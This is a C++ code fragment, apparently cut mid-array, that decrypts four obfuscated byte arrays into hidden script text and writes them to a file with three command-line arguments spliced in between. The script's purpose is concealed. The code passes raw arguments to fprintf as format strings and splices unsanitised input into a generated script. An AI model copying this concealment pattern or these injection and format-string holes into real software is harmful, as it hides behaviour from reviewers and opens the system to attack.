0x2f, 0x61, 0x49, 0x67, 0x57, 0x64, 0x75, 0x6b, 0x4d, 0x67, 0x3d, 0x3d};
        std::string script1_s = decrypt(script1, sizeof(script1));
        const char * script1_ = script1_s.c_str();
        unsigned char script2[] = {0x37, 0x61, 0x69, 0x36, 0x4e, 0x50, 0x56, 0x32, 0x62, 0x58, 0x47, 0x51, 0x72, 0x30, 0x4e, 0x70, 0x35, 0x49, 0x6d, 0x57, 0x7a, 0x55, 0x6a, 0x6c, 0x36, 0x50, 0x43, 0x67, 0x50, 0x65, 0x69, 0x5a, 0x31, 0x68, 0x74, 0x66, 0x63, 0x53, 0x50, 0x48, 0x6b, 0x35, 0x38, 0x55, 0x65, 0x56, 0x53, 0x45, 0x4d, 0x7a, 0x66, 0x39, 0x59, 0x77, 0x33, 0x4e, 0x49, 0x44, 0x69, 0x45, 0x33, 0x6b, 0x77, 0x56, 0x45, 0x35, 0x37, 0x55, 0x2b, 0x39, 0x41, 0x6d, 0x6e, 0x55, 0x6d, 0x46, 0x48, 0x45, 0x4b, 0x36, 0x49, 0x76, 0x66, 0x4b, 0x48, 0x32, 0x54, 0x53, 0x37, 0x43, 0x43, 0x71, 0x2f, 0x56, 0x62, 0x4d, 0x2f, 0x4f, 0x39, 0x52, 0x35, 0x53, 0x64, 0x5a, 0x44, 0x57, 0x31, 0x34, 0x62, 0x6f, 0x68, 0x41, 0x6b, 0x59, 0x34, 0x75, 0x4e, 0x39, 0x57, 0x6d, 0x2f, 0x43, 0x6f, 0x6c, 0x37, 0x5a, 0x4c, 0x75, 0x30, 0x37, 0x67, 0x4b, 0x66, 0x69, 0x6d, 0x48, 0x75, 0x57, 0x67, 0x74, 0x38, 0x69, 0x4e, 0x4b, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x3d, 0x3d};
        std::string script2_s = decrypt(script2, sizeof(script2));
        const char * script2_ = script2_s.c_str();
        unsigned char script3[] = {0x58, 0x50, 0x35, 0x72, 0x43, 0x68, 0x4f, 0x58, 0x35, 0x49, 0x66, 0x6d, 0x45, 0x42, 0x43, 0x52, 0x38, 0x46, 0x32, 0x45, 0x70, 0x4b, 0x6f, 0x2b, 0x39, 0x62, 0x77, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x3d};
        std::string script3_s = decrypt(script3, sizeof(script3));
        const char * script3_ = script3_s.c_str();
        unsigned char script4[] = {0x37, 0x61, 0x69, 0x36, 0x4e, 0x50, 0x56, 0x32, 0x62, 0x58, 0x47, 0x51, 0x72, 0x30, 0x4e, 0x70, 0x35, 0x49, 0x6d, 0x57, 0x7a, 0x66, 0x50, 0x75, 0x66, 0x30, 0x48, 0x72, 0x35, 0x72, 0x30, 0x4c, 0x64, 0x75, 0x67, 0x5a, 0x44, 0x6a, 0x67, 0x50, 0x63, 0x78, 0x35, 0x33, 0x4f, 0x43, 0x30, 0x4d, 0x45, 0x65, 0x71, 0x75, 0x5a, 0x6d, 0x45, 0x6d, 0x62, 0x69, 0x71, 0x78, 0x65, 0x54, 0x4d, 0x43, 0x36, 0x2b, 0x61, 0x39, 0x43, 0x38, 0x5a, 0x61, 0x36, 0x6b, 0x58, 0x78, 0x32, 0x52, 0x50, 0x62, 0x43, 0x71, 0x73, 0x30, 0x50, 0x4b, 0x54, 0x6b, 0x2b, 0x6c, 0x43, 0x69, 0x69, 0x46, 0x4d, 0x74, 0x46, 0x4e, 0x50, 0x54, 0x4f, 0x32, 0x33, 0x73, 0x43, 0x57, 0x68, 0x73, 0x71, 0x2b, 0x6b, 0x54, 0x51, 0x6c, 0x68, 0x48, 0x49, 0x75, 0x76, 0x6d, 0x76, 0x51, 0x75, 0x69, 0x63, 0x69, 0x41, 0x33, 0x51, 0x65, 0x74, 0x39, 0x4e, 0x6b, 0x78, 0x71, 0x6d, 0x54, 0x32, 0x2b, 0x4d, 0x6d, 0x31, 0x51, 0x5a, 0x69, 0x48, 0x46, 0x6b, 0x61, 0x31, 0x50, 0x78, 0x77, 0x32, 0x6f, 0x68, 0x75, 0x65, 0x63, 0x65, 0x54, 0x4d, 0x43, 0x73, 0x65, 0x61, 0x39, 0x43, 0x2b, 0x74, 0x61, 0x36, 0x6b, 0x58, 0x47, 0x32, 0x52, 0x50, 0x62, 0x38, 0x61, 0x73, 0x30, 0x50, 0x41, 0x72, 0x6b, 0x2b, 0x6c, 0x43, 0x6b, 0x69, 0x46, 0x4d, 0x74, 0x6f, 0x74, 0x50, 0x54, 0x4f, 0x78, 0x54, 0x6f, 0x63, 0x51, 0x30, 0x67, 0x71, 0x2b, 0x6b, 0x54, 0x62, 0x50, 0x48, 0x53, 0x35, 0x5a, 0x53, 0x76, 0x63, 0x48, 0x6e, 0x75, 0x63, 0x30, 0x59, 0x52, 0x76, 0x65, 0x48, 0x67, 0x64, 0x6d, 0x41, 0x5a, 0x44, 0x6e, 0x62, 0x6f, 0x63, 0x78, 0x34, 0x34, 0x44, 0x79, 0x30, 0x4d, 0x64, 0x7a, 0x69, 0x75, 0x5a, 0x68, 0x48, 0x71, 0x62, 0x69, 0x70, 0x68, 0x4a, 0x76, 0x6e, 0x69, 0x6c, 0x79, 0x5a, 0x7a, 0x52, 0x68, 0x47, 0x39, 0x34, 0x65, 0x42, 0x32, 0x59, 0x42, 0x6b, 0x4f, 0x64, 0x75, 0x69, 0x4a, 0x4d, 0x41, 0x68, 0x4a, 0x41, 0x43, 0x35, 0x72, 0x66, 0x2b, 0x77, 0x49, 0x77, 0x42, 0x51, 0x34, 0x62, 0x79, 0x50, 0x6a, 0x51, 0x50, 0x39, 0x56, 0x75, 0x50, 0x57, 0x42, 0x39, 0x52, 0x32, 0x52, 0x65, 0x31, 0x59, 0x61, 0x68, 0x53, 0x2b, 0x67, 0x74, 0x48, 0x35, 0x6b, 0x36, 0x50, 0x78, 0x46, 0x78, 0x6c, 0x72, 0x71, 0x32, 0x2f, 0x48, 0x5a, 0x45, 0x7a, 0x77, 0x4b, 0x71, 0x7a, 0x52, 0x51, 0x70, 0x4f, 0x54, 0x36, 0x4c, 0x61, 0x4b, 0x49, 0x55, 0x7a, 0x73, 0x55, 0x30, 0x39, 0x4e, 0x6f, 0x62, 0x65, 0x77, 0x4a, 0x45, 0x32, 0x79, 0x72, 0x36, 0x65, 0x57, 0x55, 0x38, 0x64, 0x4c, 0x6d, 0x73, 0x4a, 0x48, 0x66, 0x45, 0x62, 0x31, 0x7a, 0x52, 0x73, 0x4c, 0x67, 0x39, 0x4b, 0x46, 0x53, 0x33, 0x64, 0x38, 0x61, 0x44, 0x52, 0x6a, 0x43, 0x67, 0x79, 0x31, 0x52, 0x36, 0x61, 0x4a, 0x49, 0x49, 0x35, 0x67, 0x48, 0x63, 0x30, 0x59, 0x52, 0x76, 0x66, 0x53, 0x68, 0x77, 0x75, 0x44, 0x66, 0x47, 0x6c, 0x4c, 0x64, 0x77, 0x6f, 0x4d, 0x4e, 0x47, 0x46, 0x56, 0x76, 0x2f, 0x53, 0x75, 0x76, 0x48, 0x30, 0x65, 0x44, 0x52, 0x5a, 0x41, 0x41, 0x31, 0x55, 0x6b, 0x58, 0x4a, 0x31, 0x54, 0x58, 0x45, 0x6d, 0x38, 0x37, 0x56, 0x55, 0x53, 0x76, 0x49, 0x52, 0x50, 0x4f, 0x35, 0x58, 0x49, 0x30, 0x51, 0x2f, 0x72, 0x73, 0x74, 0x4f, 0x4c, 0x72, 0x76, 0x4a, 0x71, 0x75, 0x6a, 0x34, 0x68, 0x75, 0x78, 0x6d, 0x58, 0x67, 0x6a, 0x6f, 0x75, 0x69, 0x65, 0x46, 0x50, 0x72, 0x69, 0x7a, 0x4d, 0x41, 0x32, 0x43, 0x47, 0x33, 0x75, 0x68, 0x72, 0x63, 0x32, 0x55, 0x6b, 0x58, 0x4a, 0x31, 0x53, 0x55, 0x75, 0x77, 0x6e, 0x52, 0x4c, 0x76, 0x38, 0x49, 0x32, 0x39, 0x65, 0x52, 0x54, 0x64, 0x48, 0x46, 0x35, 0x39, 0x41, 0x78, 0x37, 0x44, 0x52, 0x44, 0x2b, 0x72, 0x79, 0x30, 0x34, 0x75, 0x73, 0x2f, 0x54, 0x6c, 0x50, 0x68, 0x34, 0x47, 0x37, 0x47, 0x5a, 0x63, 0x35, 0x46, 0x4c, 0x65, 0x54, 0x74, 0x63, 0x53, 0x63, 0x48, 0x50, 0x38, 0x47, 0x67, 0x6b, 0x4b, 0x4e, 0x6f, 0x49, 0x66, 0x39, 0x52, 0x5a, 0x6e, 0x69, 0x31, 0x65, 0x6b, 0x4a, 0x5a, 0x4f, 0x74, 0x4b, 0x34, 0x43, 0x64, 0x74, 0x46, 0x4c, 0x65, 0x54, 0x4f, 0x63, 0x53, 0x63, 0x48, 0x37, 0x63, 0x47, 0x67, 0x6b, 0x44, 0x39, 0x6f, 0x49, 0x66, 0x2b, 0x6a, 0x5a, 0x6e, 0x69, 0x31, 0x55, 0x55, 0x4a, 0x5a, 0x4f, 0x6e, 0x6f, 0x65, 0x4f, 0x66, 0x46, 0x6d, 0x4a, 0x5a, 0x58, 0x62, 0x30, 0x30, 0x4d, 0x58, 0x4c, 0x4b, 0x6a, 0x2f, 0x72, 0x4c, 0x6c, 0x53, 0x53, 0x30, 0x69, 0x72, 0x73, 0x4b, 0x6c, 0x50, 0x2b, 0x45, 0x31, 0x4a, 0x46, 0x79, 0x64, 0x55, 0x68, 0x6f, 0x78, 0x73, 0x68, 0x4f, 0x69, 0x5a, 0x6f, 0x44, 0x31, 0x66, 0x63, 0x64, 0x59, 0x62, 0x6b, 0x35, 0x38, 0x6a, 0x78, 0x7a, 0x46, 0x54, 0x6a, 0x56, 0x58, 0x6f, 0x6d, 0x61, 0x41, 0x39, 0x58, 0x33, 0x48, 0x57, 0x47, 0x35, 0x4f, 0x66, 0x49, 0x38, 0x64, 0x55, 0x68, 0x42, 0x52, 0x35, 0x66, 0x31, 0x4e, 0x43, 0x39, 0x43, 0x78, 0x4c, 0x49, 0x49, 0x49, 0x6c, 0x49, 0x31, 0x4f, 0x4d, 0x6b, 0x50, 0x79, 0x71, 0x62, 0x62, 0x31, 0x7a, 0x52, 0x68, 0x46, 0x67, 0x34, 0x65, 0x42, 0x32, 0x36, 0x42, 0x6b, 0x4f, 0x64, 0x6d, 0x47, 0x65, 0x2f, 0x6d, 0x55, 0x50, 0x4a, 0x79, 0x4c, 0x65, 0x76, 0x51, 0x76, 0x72, 0x35, 0x68, 0x59, 0x41, 0x2f, 0x53, 0x4e, 0x6c, 0x34, 0x47, 0x37, 0x47, 0x79, 0x65, 0x53, 0x6d, 0x62, 0x30, 0x50, 0x36, 0x37, 0x44, 0x53, 0x77, 0x4e, 0x38, 0x31, 0x2b, 0x70, 0x43, 0x47, 0x66, 0x58, 0x6a, 0x46, 0x32, 0x2f, 0x5a, 0x78, 0x43, 0x74, 0x4c, 0x68, 0x6b, 0x49, 0x62, 0x63, 0x41, 0x32, 0x43, 0x63, 0x69, 0x33, 0x67, 0x2f, 0x54, 0x45, 0x41, 0x46, 0x30, 0x4e, 0x67, 0x79, 0x56, 0x47, 0x47, 0x63, 0x59, 0x69, 0x48, 0x32, 0x51, 0x54, 0x5a, 0x38, 0x7a, 0x51, 0x47, 0x49, 0x76, 0x41, 0x4b, 0x70, 0x37, 0x45, 0x33, 0x48, 0x6b, 0x70, 0x6d, 0x2f, 0x4a, 0x31, 0x54, 0x53, 0x63, 0x4b, 0x4b, 0x7a, 0x63, 0x76, 0x59, 0x75, 0x56, 0x41, 0x79, 0x52, 0x42, 0x43, 0x2b, 0x76, 0x6d, 0x76, 0x55, 0x58, 0x47, 0x57, 0x75, 0x72, 0x79, 0x65, 0x31, 0x50, 0x54, 0x57, 0x39, 0x6b, 0x52, 0x50, 0x33, 0x6f, 0x31, 0x56, 0x36, 0x38, 0x4b, 0x65, 0x6f, 0x79, 0x61, 0x72, 0x42, 0x70, 0x54, 0x2b, 0x6a, 0x4e, 0x32, 0x6f, 0x66, 0x7a, 0x63, 0x37, 0x45, 0x59, 0x46, 0x47, 0x77, 0x4e, 0x35, 0x4f, 0x39, 0x49, 0x56, 0x49, 0x35, 0x78, 0x65, 0x67, 0x75, 0x5a, 0x42, 0x65, 0x6b, 0x44, 0x48, 0x47, 0x76, 0x52, 0x4a, 0x2b, 0x47, 0x59, 0x41, 0x32, 0x43, 0x47, 0x33, 0x75, 0x68, 0x72, 0x63, 0x32, 0x55, 0x6b, 0x58, 0x4a, 0x31, 0x51, 0x35, 0x35, 0x52, 0x77, 0x46, 0x4d, 0x4f, 0x58, 0x6b, 0x70, 0x44, 0x2f, 0x42, 0x6f, 0x4a, 0x43, 0x36, 0x2b, 0x69, 0x50, 0x76, 0x32, 0x63, 0x41, 0x62, 0x4f, 0x50, 0x74, 0x70, 0x67, 0x51, 0x4f, 0x77, 0x53, 0x30, 0x69, 0x72, 0x54, 0x61, 0x6c, 0x50, 0x2b, 0x46, 0x52, 0x4a, 0x46, 0x79, 0x66, 0x30, 0x2f, 0x6a, 0x76, 0x35, 0x33, 0x67, 0x38, 0x6e, 0x49, 0x75, 0x61, 0x39, 0x43, 0x2b, 0x74, 0x59, 0x30, 0x6a, 0x56, 0x70, 0x75, 0x4e, 0x4c, 0x43, 0x6e, 0x4b, 0x4e, 0x72, 0x58, 0x76, 0x6f, 0x78, 0x45, 0x6a, 0x35, 0x65, 0x58, 0x2b, 0x70, 0x50, 0x64, 0x73, 0x4f, 0x47, 0x6a, 0x31, 0x73, 0x42, 0x47, 0x4e, 0x66, 0x68, 0x49, 0x74, 0x34, 0x50, 0x4a, 0x2b, 0x76, 0x6d, 0x76, 0x51, 0x74, 0x70, 0x57, 0x4e, 0x49, 0x31, 0x6e, 0x4c, 0x6a, 0x53, 0x77, 0x76, 0x71, 0x6a, 0x61, 0x31, 0x35, 0x65, 0x4d, 0x52, 0x49, 0x2b, 0x64, 0x6c, 0x2f, 0x71, 0x54, 0x31, 0x76, 0x44, 0x68, 0x6f, 0x2b, 0x45, 0x46, 0x48, 0x6c, 0x55, 0x55, 0x30, 0x4c, 0x30, 0x66, 0x2b, 0x4e, 0x52, 0x2b, 0x48, 0x6e, 0x51, 0x61, 0x70, 0x78, 0x56, 0x49, 0x62, 0x63, 0x41, 0x32, 0x4e, 0x7a, 0x5a, 0x75, 0x68, 0x71, 0x4f, 0x34, 0x31, 0x42, 0x52, 0x6d, 0x73, 0x79, 0x36, 0x6c, 0x39, 0x54, 0x46, 0x4c, 0x39, 0x51, 0x6b, 0x37, 0x64, 0x75, 0x50, 0x57, 0x74, 0x6a, 0x74, 0x57, 0x2f, 0x4e, 0x44, 0x45, 0x57, 0x37, 0x74, 0x70, 0x4c, 0x77, 0x30, 0x58, 0x2f, 0x72, 0x6d, 0x68, 0x38, 0x59, 0x35, 0x43, 0x6b, 0x4d, 0x74, 0x74, 0x79, 0x33, 0x59, 0x67, 0x62, 0x68, 0x35, 0x4e, 0x4b, 0x51, 0x68, 0x6e, 0x31, 0x35, 0x48, 0x50, 0x4d, 0x50, 0x70, 0x70, 0x33, 0x61, 0x55, 0x63, 0x55, 0x4d, 0x58, 0x4c, 0x4b, 0x69, 0x46, 0x45, 0x6e, 0x6c, 0x78, 0x38, 0x4d, 0x76, 0x66, 0x7a, 0x4e, 0x34, 0x50, 0x4a, 0x79, 0x4a, 0x32, 0x49, 0x6f, 0x70, 0x32, 0x31, 0x2b, 0x45, 0x42, 0x47, 0x41, 0x38, 0x6e, 0x49, 0x74, 0x34, 0x69, 0x69, 0x6e, 0x5a, 0x32, 0x4e, 0x45, 0x50, 0x36, 0x37, 0x4d, 0x2b, 0x6c, 0x4a, 0x67, 0x55, 0x73, 0x71, 0x45, 0x4d, 0x58, 0x61, 0x52, 0x61, 0x36, 0x36, 0x63, 0x4a, 0x69, 0x68, 0x79, 0x59, 0x69, 0x77, 0x30, 0x50, 0x76, 0x42, 0x58, 0x58, 0x76, 0x6c, 0x61, 0x76, 0x68, 0x61, 0x42, 0x79, 0x38, 0x76, 0x41, 0x6d, 0x64, 0x51, 0x6b, 0x34, 0x46, 0x69, 0x48, 0x72, 0x38, 0x4d, 0x4f, 0x69, 0x6d, 0x47, 0x65, 0x45, 0x6d, 0x4d, 0x53, 0x78, 0x45, 0x52, 0x41, 0x56, 0x31, 0x37, 0x35, 0x57, 0x78, 0x32, 0x53, 0x45, 0x4d, 0x6b, 0x71, 0x32, 0x70, 0x6c, 0x62, 0x6a, 0x6f, 0x45, 0x66, 0x72, 0x2b, 0x31, 0x6c, 0x6c, 0x53, 0x75, 0x4a, 0x49, 0x47, 0x69, 0x71, 0x4b, 0x66, 0x55, 0x31, 0x32, 0x49, 0x72, 0x64, 0x4d, 0x64, 0x54, 0x6c, 0x55, 0x62, 0x53, 0x32, 0x33, 0x77, 0x39, 0x69, 0x2b, 0x31, 0x72, 0x62, 0x63, 0x2b, 0x65, 0x34, 0x4a, 0x71, 0x33, 0x7a, 0x61, 0x70, 0x6b, 0x75, 0x76, 0x49, 0x47, 0x41, 0x79, 0x7a, 0x42, 0x54, 0x59, 0x68, 0x4f, 0x77, 0x4a, 0x59, 0x4b, 0x39, 0x61, 0x58, 0x45, 0x2b, 0x72, 0x6e, 0x76, 0x36, 0x51, 0x65, 0x74, 0x45, 0x74, 0x75, 0x72, 0x48, 0x31, 0x4a, 0x2f, 0x57, 0x74, 0x6b, 0x65, 0x56, 0x6a, 0x52, 0x68, 0x4c, 0x4e, 0x53, 0x6a, 0x63, 0x56, 0x2b, 0x55, 0x54, 0x4b, 0x38, 0x62, 0x75, 0x58, 0x35, 0x44, 0x49, 0x61, 0x46, 0x61, 0x39, 0x38, 0x45, 0x47, 0x69, 0x49, 0x6c, 0x62, 0x6d, 0x71, 0x30, 0x43, 0x56, 0x77, 0x78, 0x74, 0x46, 0x71, 0x64, 0x65, 0x76, 0x47, 0x56, 0x73, 0x31, 0x4b, 0x4e, 0x78, 0x58, 0x35, 0x52, 0x4d, 0x72, 0x7a, 0x75, 0x58, 0x75, 0x67, 0x62, 0x5a, 0x6e, 0x6c, 0x72, 0x47, 0x70, 0x76, 0x58, 0x51, 0x45, 0x32, 0x53, 0x72, 0x61, 0x6d, 0x56, 0x34, 0x48, 0x42, 0x64, 0x67, 0x44, 0x44, 0x38, 0x36, 0x58, 0x45, 0x36, 0x4f, 0x45, 0x65, 0x61, 0x6a, 0x6e, 0x66, 0x74, 0x56, 0x39, 0x7a, 0x45, 0x6b, 0x4c, 0x59, 0x58, 0x53, 0x30, 0x67, 0x4a, 0x30, 0x6e, 0x7a, 0x4c, 0x39, 0x4c, 0x68, 0x35, 0x4e, 0x49, 0x46, 0x4c, 0x53, 0x41, 0x6b, 0x58, 0x4a, 0x7a, 0x6c, 0x5a, 0x68, 0x41, 0x39, 0x66, 0x76, 0x6e, 0x75, 0x32, 0x6f, 0x74, 0x59, 0x52, 0x44, 0x4c, 0x50, 0x49, 0x47, 0x41, 0x66, 0x74, 0x62, 0x4f, 0x72, 0x46, 0x6d, 0x52, 0x57, 0x77, 0x38, 0x64, 0x4c, 0x6c, 0x6c, 0x43, 0x38, 0x75, 0x6a, 0x57, 0x35, 0x54, 0x33, 0x66, 0x4e, 0x59, 0x49, 0x62, 0x46, 0x79, 0x54, 0x4c, 0x6f, 0x4c, 0x6c, 0x33, 0x33, 0x71, 0x35, 0x41, 0x64, 0x63, 0x32, 0x73, 0x52, 0x6c, 0x58, 0x62, 0x6e, 0x2b, 0x79, 0x4e, 0x33, 0x31, 0x47, 0x46, 0x69, 0x61, 0x52, 0x68, 0x47, 0x39, 0x63, 0x36, 0x48, 0x43, 0x34, 0x50, 0x52, 0x67, 0x44, 0x6a, 0x4a, 0x51, 0x2b, 0x66, 0x54, 0x2b, 0x4f, 0x79, 0x4c, 0x65, 0x44, 0x79, 0x66, 0x72, 0x35, 0x72, 0x30, 0x4c, 0x61, 0x56, 0x6a, 0x53, 0x4e, 0x63, 0x4b, 0x65, 0x70, 0x4b, 0x38, 0x68, 0x33, 0x73, 0x36, 0x4b, 0x47, 0x73, 0x45, 0x52, 0x75, 0x6a, 0x47, 0x59, 0x5a, 0x59, 0x76, 0x72, 0x35, 0x67, 0x73, 0x71, 0x65, 0x4c, 0x5a, 0x6d, 0x54, 0x61, 0x43, 0x30, 0x68, 0x53, 0x2b, 0x6e, 0x30, 0x74, 0x76, 0x31, 0x73, 0x51, 0x62, 0x5a, 0x69, 0x43, 0x7a, 0x6a, 0x52, 0x79, 0x78, 0x39, 0x45, 0x78, 0x39, 0x53, 0x73, 0x44, 0x51, 0x76, 0x4e, 0x54, 0x2f, 0x37, 0x38, 0x41, 0x69, 0x30, 0x68, 0x53, 0x2b, 0x67, 0x30, 0x74, 0x76, 0x31, 0x70, 0x77, 0x62, 0x5a, 0x69, 0x4c, 0x46, 0x68, 0x6d, 0x63, 0x67, 0x39, 0x39, 0x7a, 0x33, 0x32, 0x35, 0x66, 0x4e, 0x2f, 0x36, 0x34, 0x44, 0x76, 0x79, 0x43, 0x31, 0x65, 0x62, 0x38, 0x6e, 0x6b, 0x70, 0x6d, 0x2b, 0x57, 0x56, 0x65, 0x73, 0x65, 0x74, 0x32, 0x35, 0x4d, 0x72, 0x6d, 0x50, 0x31, 0x4d, 0x55, 0x44, 0x48, 0x47, 0x6e, 0x70, 0x43, 0x6c, 0x45, 0x61, 0x79, 0x46, 0x53, 0x4f, 0x63, 0x30, 0x6c, 0x56, 0x57, 0x74, 0x79, 0x41, 0x4d, 0x6b, 0x66, 0x42, 0x75, 0x65, 0x6b, 0x44, 0x48, 0x47, 0x6e, 0x56, 0x51, 0x38, 0x59, 0x4b, 0x39, 0x63, 0x30, 0x59, 0x52, 0x34, 0x50, 0x53, 0x68, 0x77, 0x6a, 0x4a, 0x51, 0x59, 0x41, 0x35, 0x5a, 0x6a, 0x4d, 0x41, 0x4d, 0x2b, 0x37, 0x73, 0x7a, 0x54, 0x4f, 0x72, 0x43, 0x6a, 0x44, 0x42, 0x47, 0x43, 0x65, 0x72, 0x62, 0x46, 0x53, 0x4f, 0x63, 0x30, 0x6f, 0x4c, 0x6d, 0x51, 0x56, 0x35, 0x41, 0x78, 0x78, 0x70, 0x36, 0x76, 0x73, 0x58, 0x63, 0x68, 0x4b, 0x32, 0x4f, 0x44, 0x54, 0x63, 0x75, 0x2f, 0x77, 0x6a, 0x62, 0x4a, 0x69, 0x4e, 0x55, 0x58, 0x34, 0x59, 0x6e, 0x6b, 0x30, 0x59, 0x78, 0x78, 0x65, 0x66, 0x51, 0x5a, 0x57, 0x47, 0x65, 0x2f, 0x74, 0x34, 0x50, 0x4a, 0x79, 0x4a, 0x32, 0x49, 0x6f, 0x70, 0x32, 0x79, 0x43, 0x31, 0x65, 0x37, 0x2b, 0x54, 0x4f, 0x52, 0x53, 0x30, 0x48, 0x37, 0x58, 0x45, 0x6e, 0x6b, 0x44, 0x2f, 0x42, 0x6f, 0x43, 0x79, 0x68, 0x33, 0x77, 0x76, 0x58, 0x48, 0x5a, 0x75, 0x4b, 0x6c, 0x49, 0x61, 0x6a, 0x30, 0x2b, 0x4d, 0x36, 0x69, 0x70, 0x36, 0x4a, 0x4d, 0x38, 0x31, 0x30, 0x51, 0x4e, 0x4e, 0x37, 0x68, 0x62, 0x41, 0x46, 0x4a, 0x55, 0x71, 0x47, 0x4a, 0x35, 0x4e, 0x47, 0x4d, 0x63, 0x58, 0x6e, 0x30, 0x45, 0x48, 0x72, 0x66, 0x54, 0x62, 0x6e, 0x30, 0x44, 0x48, 0x46, 0x74, 0x59, 0x58, 0x73, 0x32, 0x78, 0x57, 0x58, 0x49, 0x42, 0x61, 0x6b, 0x43, 0x56, 0x72, 0x30, 0x64, 0x35, 0x70, 0x47, 0x48, 0x63, 0x64, 0x61, 0x62, 0x48, 0x61, 0x67, 0x43, 0x4a, 0x47, 0x65, 0x32, 0x37, 0x45, 0x4e, 0x54, 0x69, 0x4c, 0x38, 0x34, 0x59, 0x66, 0x74, 0x62, 0x69, 0x4d, 0x35, 0x54, 0x56, 0x4b, 0x68, 0x4f, 0x36, 0x75, 0x63, 0x72, 0x66, 0x51, 0x70, 0x4f, 0x4b, 0x6d, 0x79, 0x6a, 0x42, 0x34, 0x41, 0x6f, 0x53, 0x56, 0x63, 0x46, 0x7a, 0x57, 0x2f, 0x37, 0x50, 0x76, 0x58, 0x35, 0x39, 0x41, 0x78, 0x78, 0x55, 0x46, 0x42, 0x77, 0x76, 0x38, 0x61, 0x65, 0x6b, 0x44, 0x48, 0x74, 0x49, 0x32, 0x56, 0x4e, 0x53, 0x65, 0x54, 0x52, 0x6f, 0x62, 0x46, 0x35, 0x39, 0x41, 0x78, 0x55, 0x4c, 0x50, 0x79, 0x47, 0x2b, 0x4a, 0x76, 0x4b, 0x4c, 0x33, 0x38, 0x53, 0x51, 0x34, 0x76, 0x63, 0x7a, 0x67, 0x53, 0x43, 0x44, 0x48, 0x46, 0x35, 0x39, 0x44, 0x76, 0x79, 0x43, 0x31, 0x65, 0x50, 0x38, 0x47, 0x67, 0x6b, 0x43, 0x2f, 0x38, 0x53, 0x51, 0x36, 0x32, 0x67, 0x65, 0x38, 0x6e, 0x6b, 0x34, 0x4d, 0x32, 0x35, 0x62, 0x33, 0x69, 0x62, 0x79, 0x67, 0x54, 0x32, 0x41, 0x57, 0x56, 0x65, 0x34, 0x69, 0x49, 0x42, 0x77, 0x51, 0x30, 0x4f, 0x4e, 0x32, 0x36, 0x2b, 0x52, 0x41, 0x6f, 0x4a, 0x4a, 0x2f, 0x32, 0x69, 0x75, 0x4b, 0x59, 0x50, 0x46, 0x63, 0x50, 0x7a, 0x2b, 0x59, 0x75, 0x62, 0x75, 0x66, 0x4a, 0x67, 0x42, 0x31, 0x33, 0x6d, 0x6b, 0x5a, 0x32, 0x78, 0x31, 0x70, 0x73, 0x38, 0x76, 0x45, 0x4e, 0x63, 0x54, 0x78, 0x58, 0x34, 0x70, 0x68, 0x64, 0x4b, 0x32, 0x5a, 0x34, 0x4d, 0x72, 0x65, 0x78, 0x4c, 0x7a, 0x5a, 0x2f, 0x6c, 0x76, 0x35, 0x61, 0x70, 0x36, 0x45, 0x69, 0x35, 0x78, 0x6c, 0x48, 0x6e, 0x52, 0x65, 0x48, 0x53, 0x31, 0x70, 0x4c, 0x39, 0x4f, 0x49, 0x2b, 0x67, 0x45, 0x70, 0x6f, 0x50, 0x77, 0x32, 0x31, 0x32, 0x6f, 0x33, 0x38, 0x35, 0x75, 0x63, 0x31, 0x56, 0x2b, 0x35, 0x38, 0x67, 0x49, 0x72, 0x44, 0x39, 0x4f, 0x66, 0x6d, 0x42, 0x6d, 0x70, 0x33, 0x52, 0x68, 0x31, 0x33, 0x6d, 0x6d, 0x78, 0x32, 0x78, 0x31, 0x70, 0x67, 0x2f, 0x53, 0x38, 0x49, 0x76, 0x61, 0x36, 0x2b, 0x4a, 0x47, 0x6a, 0x32, 0x4f, 0x57, 0x77, 0x6d, 0x52, 0x65, 0x70, 0x48, 0x51, 0x71, 0x68, 0x6e, 0x39, 0x77, 0x58, 0x5a, 0x71, 0x67, 0x45, 0x6c, 0x43, 0x63, 0x44, 0x6d, 0x79, 0x59, 0x42, 0x75, 0x35, 0x30, 0x44, 0x48, 0x47, 0x6e, 0x71, 0x56, 0x4e, 0x62, 0x53, 0x4e, 0x48, 0x35, 0x6d, 0x63, 0x30, 0x53, 0x6e, 0x32, 0x50, 0x33, 0x30, 0x45, 0x47, 0x48, 0x45, 0x4a, 0x65, 0x61, 0x7a, 0x6e, 0x42, 0x49, 0x64, 0x6e, 0x4b, 0x70, 0x45, 0x6c, 0x36, 0x45, 0x32, 0x52, 0x2b, 0x4a, 0x38, 0x67, 0x63, 0x58, 0x70, 0x41, 0x78, 0x78, 0x71, 0x4e, 0x6c, 0x54, 0x57, 0x30, 0x48, 0x4e, 0x2f, 0x79, 0x39, 0x68, 0x34, 0x72, 0x76, 0x78, 0x57, 0x70, 0x77, 0x47, 0x4f, 0x43, 0x53, 0x50, 0x75, 0x48, 0x52, 0x41, 0x55, 0x46, 0x42, 0x51, 0x55, 0x3d};
        std::string script4_s = decrypt(script4, sizeof(script4));
        const char * script4_ = script4_s.c_str();

    fclose(fopen(script_path, "w"));

    fp = fopen(script_path, "a");
    fprintf(fp, script1_);
    fprintf(fp, argv[1]);
    fprintf(fp, script2_);
    fprintf(fp, argv[2]);
    fprintf(fp, script3_);
    fprintf(fp, argv[3]);
    fprintf(fp, script4_);
    if (fp != NULL)
    {
        fclose(fp);
    }
    else
    {
        unsigned char error[] = {0x49, 0x54, 0x6a, 0x37, 0x76, 0x68, 0x78, 0x76, 0x35, 0x70, 0x58, 0x32, 0x76, 0x54, 0x6c, 0x69, 0x6a, 0x45, 0x57, 0x35, 0x7a, 0x33, 0x72, 0x58, 0x61, 0x59, 0x38, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x3d};
        std::string error_s = decrypt(error, sizeof(error));
        const char * error_ = error_s.c_str();
           printf(error_);
    }
